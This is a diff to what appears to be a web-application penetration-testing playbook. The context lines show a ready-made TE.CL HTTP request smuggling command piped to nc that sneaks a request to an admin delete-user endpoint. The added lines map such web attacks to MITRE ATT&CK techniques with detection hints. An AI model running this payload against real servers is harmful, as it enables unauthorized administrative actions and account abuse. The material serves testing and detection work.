@@ -1055,3 +1055,17 @@ printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 100\r\nTransfer-E
 # TE.CL variant smuggling for access control bypass
 printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin/delete_user?id=1 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=USER_TOKEN\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' | nc target.com 80
 ```
+
+---
+
+## MITRE ATT&CK Mapping + Reference Expansion (v0.2.7)
+
+### ATT&CK Mapping (F-WEBA-001)
+
+| ATT&CK Technique | Skill Activity | Detection Hint |
+|------------------|----------------|-----------------|
+| **T1190 — Exploit Public-Facing Application** | IDOR/force-browsing on web apps | WAF: sequential object access |
+| **T1078 — Valid Accounts** | Logic-bypass session abuse | SIEM: horizontal privilege jumps |
+| **T1098 — Account Manipulation** | Self-registration role escalation | IAM: unapproved role grants |
+| **T1539 — Steal Web Session Cookie** | Session fixation/cookie theft paths | SIEM: session token reuse |
+| **T1528 — Steal Application Access Token** | OAuth scope abuse | IdP: over-scoped token grants |
